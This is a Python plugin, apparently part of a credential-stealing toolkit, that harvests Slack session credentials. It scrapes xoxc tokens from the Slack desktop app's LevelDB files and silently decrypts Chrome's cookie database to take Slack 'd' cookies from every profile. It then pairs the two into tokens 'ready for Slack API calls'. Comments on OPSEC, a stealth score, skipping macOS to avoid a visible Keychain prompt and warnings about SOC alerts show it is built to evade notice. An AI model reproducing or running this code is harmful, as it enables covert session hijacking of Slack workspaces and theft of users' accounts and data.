"""Slack combined collector — correlates xoxc tokens with d cookies.

The Slack API requires BOTH an xoxc token (from the desktop app's LevelDB)
AND the browser d cookie for authentication. This collector runs both
extraction pipelines and produces correlated tokens ready for API use.

OPSEC:
  - Windows/Linux: SILENT (desktop LevelDB read + DPAPI/'peanuts' cookie decrypt)
  - macOS: xoxc extraction is silent, but d cookie extraction is SKIPPED
    (Keychain prompt would be user-visible). Returns xoxc-only with a warning.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import SecureString, secure
from ...platform_utils import (
    chrome_user_data_dir,
    get_platform,
    slack_data_dir,
)


_SLACK_HOST_PATTERNS = [".slack.com"]
_SLACK_COOKIE_NAMES = {"d"}


@CollectorRegistry.register
class SlackCombinedCollector(BaseCollector):
    service = "slack"
    source = "combined"
    stealth_score = 5
    # No platform restriction — runs everywhere, but d_cookie extraction
    # is only attempted on Windows/Linux (macOS triggers Keychain prompt).

    # ---- internal helpers (inlined from desktop + browser_cookies) --------

    def _find_storage_dirs(self) -> List[Path]:
        """Find Slack desktop LevelDB directories."""
        dirs = []
        base = slack_data_dir()

        ls_dir = base / "Local Storage" / "leveldb"
        if ls_dir.exists():
            dirs.append(ls_dir)

        storage_dir = base / "storage"
        if storage_dir.exists():
            dirs.append(storage_dir)

        return dirs

    def _has_xoxc_tokens(self) -> bool:
        """Quick scan to see if xoxc tokens exist in desktop LevelDB."""
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    if "xoxc-" in text:
                        return True
                except Exception:
                    continue
        return False

    def _has_d_cookie_sources(self) -> bool:
        """Quick check: is there a Chrome Cookies DB that might have d cookies?"""
        if get_platform() == "macos":
            return False  # Keychain prompt — skip on macOS
        chrome_dir = chrome_user_data_dir()
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_db = chrome_dir / profile / "Cookies"
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"
            if cookies_db.exists():
                return True
        return False

    def _extract_xoxc_tokens(self) -> List[str]:
        """Extract unique xoxc tokens from Slack desktop LevelDB."""
        tokens: List[str] = []
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    for match in re.finditer(r"(xoxc-[A-Za-z0-9-]+)", text):
                        token_val = match.group(1)
                        if len(token_val) > 20:
                            tokens.append(token_val)
                except Exception:
                    continue

        # Deduplicate preserving order
        seen: set[str] = set()
        unique: List[str] = []
        for t in tokens:
            if t not in seen:
                seen.add(t)
                unique.append(t)
        return unique

    def _extract_d_cookies(self) -> List[dict]:
        """Extract Slack d cookies from Chrome. Returns [] on macOS or failure."""
        if get_platform() == "macos":
            return []

        # Check optional dependency
        try:
            import cryptography  # noqa: F401
        except ImportError:
            self._warn(
                "Missing dependency: cryptography. "
                "Install with: pip install cryptography"
            )
            return []

        from ...core.chromium_decrypt import (
            extract_cookies,
            get_chrome_key,
            DecryptError,
        )

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        results: List[dict] = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

        for profile in profiles:
            try:
                cookies = extract_cookies(
                    profile=profile,
                    host_patterns=_SLACK_HOST_PATTERNS,
                    key=key,
                )
            except DecryptError as e:
                self._warn(f"Failed to extract cookies from {profile}: {e}")
                continue
            except Exception as e:
                self._warn(f"Unexpected error extracting from {profile}: {e}")
                continue

            d_cookies = [c for c in cookies if c["name"] in _SLACK_COOKIE_NAMES]
            for d in d_cookies:
                d["_profile"] = profile
                results.append(d)

        return results

    # ---- public interface -------------------------------------------------

    def discover(self) -> List[DiscoveredToken]:
        """Check if BOTH desktop xoxc tokens AND browser d cookies are available."""
        has_xoxc = self._has_xoxc_tokens()
        has_d = self._has_d_cookie_sources()

        if not has_xoxc and not has_d:
            return []

        parts = []
        if has_xoxc:
            parts.append("xoxc from desktop")
        if has_d:
            parts.append("d cookie from browser")

        coverage = " + ".join(parts)
        status = "BOTH available" if (has_xoxc and has_d) else "partial"

        return [
            DiscoveredToken(
                service=self.service,
                source=self.source,
                stealth_score=self.stealth_score,
                details=f"combined: {coverage} ({status})",
            )
        ]

    def collect(self) -> List[CollectedToken]:
        """Correlate xoxc tokens with d cookies into combined tokens."""
        xoxc_tokens = self._extract_xoxc_tokens()
        d_cookies = self._extract_d_cookies()

        results: List[CollectedToken] = []

        if xoxc_tokens and d_cookies:
            # Best case: both sides available — create correlated tokens.
            # Use the first d_cookie value for all xoxc tokens (they share
            # the browser session). If multiple d_cookies exist (multi-profile),
            # pair each xoxc with the first available d_cookie.
            d_value = d_cookies[0]["value"]
            d_profile = d_cookies[0].get("_profile", "unknown")

            for xoxc in xoxc_tokens:
                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        access_token=secure(xoxc),
                        extra={
                            "d_cookie": d_value,
                            "token_type": "xoxc+d_cookie",
                            "d_cookie_profile": d_profile,
                            "note": (
                                "Combined xoxc + d cookie — ready for Slack "
                                "API calls. WARNING: browser token usage may "
                                "trigger SOC alerts."
                            ),
                        },
                    )
                )

            self._info(
                f"Correlated {len(xoxc_tokens)} xoxc token(s) with d cookie "
                f"from chrome:{d_profile}"
            )

        elif xoxc_tokens and not d_cookies:
            # xoxc only — warn about missing d_cookie
            reason = (
                "macOS Keychain prompt would be visible"
                if get_platform() == "macos"
                else "Chrome d cookie extraction failed or not available"
            )

            for xoxc in xoxc_tokens:
                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        access_token=secure(xoxc),
                        extra={
                            "token_type": "xoxc",
                            "note": (
                                f"xoxc token only — d cookie NOT available "
                                f"({reason}). Slack API calls will FAIL "
                                f"without the d cookie."
                            ),
                        },
                    )
                )

            self._warn(
                f"Found {len(xoxc_tokens)} xoxc token(s) but NO d cookie "
                f"({reason}). API calls will fail without d cookie."
            )

        elif d_cookies and not xoxc_tokens:
            # d_cookie only — return with a note
            for d in d_cookies:
                results.append(
                    CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        access_token=secure(d["value"]),
                        extra={
                            "token_type": "d_cookie_only",
                            "cookie_name": "d",
                            "host": d.get("host", ""),
                            "profile": d.get("_profile", "unknown"),
                            "note": (
                                "d cookie only — no xoxc token found in "
                                "Slack desktop app. Cannot make API calls "
                                "without the xoxc token."
                            ),
                        },
                    )
                )

            self._warn(
                f"Found {len(d_cookies)} d cookie(s) but NO xoxc token. "
                f"Slack desktop app may not be installed."
            )

        return results
